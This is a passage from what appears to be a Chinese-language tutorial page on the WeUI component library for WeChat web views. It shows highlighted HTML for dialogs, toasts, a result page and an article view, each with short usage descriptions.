style=\"border:none;width:414px;height:auto;\"></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_confirm\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_mask\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_hd\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">strong</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_title\"</span>&gt;</span>弹窗标题<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">strong</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_bd\"</span>&gt;</span>自定义弹窗内容<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">br</span>&gt;</span>...<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_ft\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn_dialog default\"</span>&gt;</span>取消<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn_dialog primary\"</span>&gt;</span>确定<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184836_FSZ3.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_alert\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_mask\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_hd\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">strong</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_title\"</span>&gt;</span>弹窗标题<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">strong</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_bd\"</span>&gt;</span>弹窗内容，告知当前页面信息等<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_dialog_ft\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn_dialog primary\"</span>&gt;</span>确定<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">Toast</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">toast用于临时显示某些信息，并且会在数秒后自动消失。这些信息通常是轻量级操作的成功、失败或等待状态信息。</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184837_IWSY.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"toast\"</span> <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"display: none;\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_mask_transparent\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_toast\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_toast\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_toast_content\"</span>&gt;</span>已完成<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184839_g80t.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"loadingToast\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_toast\"</span> <span class=\"hljs-attr\">style</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"display:none;\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_mask_transparent\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_toast\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading\"</span>&gt;</span>            <span class=\"hljs-comment\" style=\"color:rgb(127,159,127);\">&lt;!-- :) --&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_0\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_1\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_2\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_3\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_4\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_5\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_6\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_7\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_8\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_9\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_10\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_loading_leaf weui_loading_leaf_11\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_toast_content\"</span>&gt;</span>数据加载中<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">Msg Page</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">结果页通常来说可以认为进行一系列操作步骤后，作为流程结束的总结性页面。结果页的作用主要是告知用户操作处理结果以及必要的相关细节（可用于确认 之前的操作是否有误）等信息；若该流程用于开启或关闭某些重要功能，可在结果页增加与该功能相关的描述性内容；除此之外，结果页也可以承载一些附加价值操 作，例如提供抽奖、关注公众号等功能入口。</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184840_xC8r.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_msg\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_area\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_icon_success weui_icon_msg\"</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">i</span>&gt;</span><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_text_area\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h2</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_msg_title\"</span>&gt;</span>操作成功<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h2</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_msg_desc\"</span>&gt;</span>内容详情，可根据实际需要安排<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_opr_area\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn_area\"</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_primary\"</span>&gt;</span>确定<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n            <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"javascript:;\"</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_btn weui_btn_default\"</span>&gt;</span>取消<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">p</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_extra_area\"</span>&gt;</span>\n        <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"\"</span>&gt;</span>查看详情<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">a</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span>\n<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">div</span>&gt;</span></code></pre><h3 style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">Article</h3><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">文字视图显示大段文字，这些文字通常是页面上的主体内容。<code style=\"font-family:monospace, monospace;font-size:1em;\">Article</code>支持分段、多层标题、引用、内嵌图片、有/无序列表等富文本样式，并可响应用户的选择操作。</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\">在微信客户端webview中使用<code style=\"font-family:monospace, monospace;font-size:1em;\">Article</code>，必须保证文字有足够的可读性和可辨识性、使用规范字体、保证足够的段间距、段首无缩进。</p><p style=\"color:rgb(17,17,17);font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, sans-serif;background-color:rgb(255,255,255);\"><img src=\"http://static.oschina.net/uploads/img/201510/13184841_TzxC.png\" alt=\"\" style=\"border:none;width:414px;height:auto;\"></p><pre><code class=\"language-html\"><span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">article</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\" style=\"color:rgb(204,147,147);\">\"weui_article\"</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h1</span>&gt;</span>大标题<span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;/<span class=\"hljs-name\" style=\"color:rgb(239,239,143);\">h1</span>&gt;</span>\n    <span class=\"hljs-tag\" style=\"color:rgb(227,206,171);\">&lt;<span class=\"hljs-name\" 